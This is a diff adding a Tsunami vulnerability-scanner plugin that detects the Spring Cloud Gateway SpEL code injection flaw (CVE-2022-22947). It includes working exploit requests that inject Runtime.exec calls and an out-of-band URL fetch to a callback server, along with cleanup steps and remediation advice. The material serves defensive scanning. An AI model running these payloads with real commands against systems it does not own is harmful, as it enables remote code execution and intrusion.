@@ -1,0 +1,171 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Spring_Cloud_Gateway_CVE_2022_22947"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version, "
+    "hh-hunter for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2022_22947"
+  }
+  severity: CRITICAL
+  title: "Spring Cloud Gateway Actuator API SpEL Code Injection (CVE-2022-22947)"
+  recommendation:
+    "Users of affected versions should apply the following remediation. 3.1.x users"
+    " should upgrade to 3.1.1+. 3.0.x users should upgrade to 3.0.7+. If the"
+    " Gateway actuator endpoint is not needed it should be disabled via "
+    "management.endpoint.gateway.enabled: false. If the actuator is required"
+    " it should be secured using Spring Security, "
+    "see https://docs.spring.io/spring-boot/docs/current/reference/html/"
+    "actuator.html#actuator.endpoints.security."
+  description:
+    "In spring cloud gateway versions prior to 3.1.1+ and 3.0.7+ , applications are vulnerable "
+    "to a code injection attack when the Gateway Actuator endpoint is enabled, exposed and "
+    "unsecured. A remote attacker could make a maliciously crafted request that could allow"
+    " arbitrary remote execution on the remote host."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2022-22947"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+# No fingerprint because it doesn't appear to be easily fingerprintable. None in the original plugin.
+
+actions: {
+  name: "create_router_reflective"
+  http_request: {
+    method: POST
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    data: '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader","args":{"name":"Result=","value":"#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(\\\"{{ PAYLOAD }}\\\").getInputStream()))}"}}],"uri":"http://localhost"}'
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: ["delete_router", "refresh"]
+}
+
+actions: {
+  name: "create_router_oob"
+  http_request: {
+    method: POST
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    data: 
+      '{"id":"{{ T_UTL_CURRENT_TIMESTAMP_MS }}","filters":[{"name":"AddResponseHeader"'
+      ',"args":{"name":"Result=","value":"#{new String(T(org.springframework.util.Stre'
+      'amUtils).copyToByteArray(new java.net.URL(\'{{ T_CBS_URI }}\').openStream()))}"'
+      '}}],"uri":"http://localhost"}'
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: ["delete_router", "refresh"]
+}
+
+actions: {
+  name: "refresh"
+  http_request: {
+    method: POST
+    uri: "/actuator/gateway/refresh"
+  }
+}
+
+# I had a response status code check in this action but it didn't work well for testing, since we need an endpoint in the tests
+# that returns two different status codes. Since we're looking for a very specific value here, it should be okay.
+
+actions: {
+  name: "get_router_reflective"
+  http_request: {
+    method: GET
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    response: {
+      expect_all: {
+        conditions: { body {} contains: '1f21f020c9' }
+      }
+    }
+  }
+}
+
+# for the oob version we don't care about if the response matches anything
+
+actions: {
+  name: "get_router_oob"
+  http_request: {
+    method: GET
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+  }
+}
+
+actions: {
+  name: "delete_router"
+  http_request: {
+    method: DELETE
+    uri: "/actuator/gateway/routes/{{ T_UTL_CURRENT_TIMESTAMP_MS }}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "sleep"
+  utility: { sleep: { duration_ms: 1000 } }
+}
+actions: {
+  name: "check_callback_server_logs"
+  callback_server: { action_type: CHECK }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+# oob
+# note that the payload can't contain quotes or it breaks the JSON request body
+
+workflows: {
+  condition: REQUIRES_CALLBACK_SERVER
+  actions: [
+    "create_router_oob",
+    "refresh",
+    "get_router_oob",
+    "sleep",
+    "check_callback_server_logs"
+  ]
+}
+
+# reflective
+# note that the payload can't contain quotes or it breaks the JSON request body
+
+workflows: {
+  variables: [
+    { name: "PAYLOAD" value: "printf %x 133713371337"}
+  ]
+  actions: [
+    "create_router_reflective",
+    "refresh",
+    "get_router_reflective"
+  ]
+}
